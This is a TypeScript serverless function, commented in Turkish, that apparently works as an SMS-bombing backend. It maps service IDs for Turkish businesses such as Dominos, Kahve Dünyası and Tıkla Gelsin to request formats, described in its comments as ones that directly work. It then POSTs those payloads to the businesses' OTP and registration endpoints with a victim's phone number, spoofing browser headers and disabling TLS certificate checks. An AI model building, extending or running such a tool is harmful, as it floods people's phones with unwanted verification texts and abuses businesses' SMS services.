// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const formatPhone = (p: string) => {
  const raw = p.replace(/\D/g, '');
  return {
    raw: raw.startsWith('90') ? raw.substring(2) : (raw.startsWith('0') ? raw.substring(1) : raw), // 555...
    with90: raw.startsWith('90') ? raw : (raw.startsWith('0') ? '9' + raw : '90' + raw), // 90555...
    with0: raw.startsWith('90') ? '0' + raw.substring(2) : (raw.startsWith('0') ? raw : '0' + raw), // 0555...
  };
};

export default async function handler(req: VercelRequest, res: VercelResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    let body: any = {};
    try { body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body; } catch {}
    
    if (!body.serviceUrl) return res.status(400).json({ error: 'Missing URL' });

    let targetUrl = body.serviceUrl.trim();
    if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;

    const phones = formatPhone(body.targetPhone || '5555555555');
    const serviceId = (body.serviceId || '').toLowerCase();

    // --- SNIPER PAYLOAD HARİTASI (Kesin Doğrular) ---
    // Burası "Deneme yanılma" değil, direkt çalışan formatlardır.
    
    let payload = {};

    switch (true) {
        // 1. KESİN ÇALIŞANLAR
        case serviceId.includes('kahve_dunyasi'):
            payload = { countryCode: "90", phoneNumber: phones.raw };
            break;
        case serviceId.includes('english_home'):
            payload = { Phone: phones.with0, Source: "WEB" }; // 05... ve Source şart
            break;
        case serviceId.includes('file_market'):
            payload = { mobilePhoneNumber: phones.with90 }; // 905...
            break;
        case serviceId.includes('dominos'):
            payload = { mobilePhone: phones.raw, isSure: true }; // isSure true olmalı
            break;
        case serviceId.includes('yapp'):
            payload = { phone_number: phones.raw, device_name: "Web" };
            break;
        case serviceId.includes('hayat_su'):
            payload = { mobilePhoneNumber: phones.with0, deviceId: "web" };
            break;
        case serviceId.includes('suiste'):
            payload = { gsm: phones.raw, action: "register" };
            break;

        // 2. YENİ EKLENENLER (Düzeltilenler)
        case serviceId.includes('tikla_gelsin'):
            // GraphQL özel yapısı
            payload = { 
                operationName: "GENERATE_OTP", 
                variables: { phone: phones.raw, countryCode: "TR" }, 
                query: "mutation GENERATE_OTP($phone: String!, $countryCode: String) { generateOtp(phone: $phone, countryCode: $countryCode) { isSuccess message } }" 
            };
            break;
        case serviceId.includes('komagene'):
             // Komagene genellikle raw ister
            payload = { Telefon: phones.raw };
            break;
        case serviceId.includes('baydoner'):
            payload = { Gsm: phones.raw, Name: "M", Surname: "K" };
            break;
        case serviceId.includes('kofteci_yusuf'):
            payload = { Telefon: phones.raw, FirmaId: 82 };
            break;
        
        // 3. GENEL FALLBACK (Diğerleri için)
        default:
            // Varsayılan olarak en yaygın formatı atıyoruz
            payload = { phone: phones.raw, mobile: phones.raw, phoneNumber: phones.raw };
            break;
    }

    // İSTEK AT
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);

    const response = await fetch(targetUrl, {
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Content-Type': 'application/json',
            'Origin': new URL(targetUrl).origin,
            'Referer': new URL(targetUrl).origin + '/'
        },
        body: JSON.stringify(payload),
        signal: controller.signal
    });

    clearTimeout(timeout);
    const responseText = await response.text();

    return res.status(200).json({
        reachable: true,
        ok: response.ok,
        status: 200,
        upstreamStatus: response.status,
        serviceId: body.serviceId,
        sentPayload: payload, // Debug için ne gönderdiğimizi görelim
        error: response.ok ? null : `Status: ${response.status}`
    });

  } catch (error: any) {
    return res.status(200).json({ ok: false, error: error.message });
  }
}